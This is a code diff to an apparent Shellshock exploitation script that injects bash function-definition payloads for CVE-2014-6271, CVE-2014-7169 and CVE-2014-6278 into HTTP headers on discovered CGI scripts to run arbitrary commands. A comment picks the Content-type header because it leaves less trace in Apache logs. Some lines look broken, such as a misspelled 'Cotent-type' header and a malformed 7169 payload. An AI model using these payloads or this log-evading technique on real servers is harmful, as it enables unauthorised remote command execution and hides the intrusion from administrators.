@@ -46,9 +46,13 @@ from collections import OrderedDict
 
 # Dictionary {CVE ref: (header, exploit)} to try on discovered CGI scripts
 # Where attack string comprises exploit + success_flag + command
+# We use the Content-type header rather than User-agent as the latter
+# leaves an obvious trace in Apache's logs whilst the former doesn't...
+# Note - Currently only CVE-2014-6271 works
 attacks = {
-    "CVE-2014-6271": ("Content-type", "() { :;}; echo; "),
-    "CVE-2014-7169": ("Content-type", "() { ignored; }; echo; ")
+    "CVE-2014-6271": ("Content-type", "() { :;}; echo; %s"),
+    "CVE-2014-7169": ("Cotent-type", "'() { function a a>\' bash -c /tmp/echo"),
+    #"CVE-2014-6278": ("Content-type", "() { _; } >_[$($())] { %s; }"),
     }
     
 # Wrapper object for sys.sdout to elimate buffering
@@ -109,7 +113,7 @@ def check_hosts(host_target_list, port, verbose):
         except Exception as e:
             print "[!] Exception - %s: %s" % (host, e)
             print "[!] Omitting %s from target list..." % host
-    if len(host_target_list) > 1:
+    if len(confirmed_hosts) > 1:
         print "[+] %i of %i targets were reachable" % \
                             (len(confirmed_hosts), number_of_targets)
     else:
@@ -215,7 +219,8 @@ def do_exploit_cgi(proxy, target_list, command, verbose):
         for cve_reference, exploit_details in attacks.iteritems():
             header = exploit_details[0]
             exploit = exploit_details[1]
-            attack = exploit + " echo " + success_flag + "; " + command
+            check_string = " echo " + success_flag + "; " + command
+            attack = exploit % check_string
 	    print "DEBUG " + attack
             result = do_attack(proxy, target, header, attack, verbose)
             if success_flag in result:
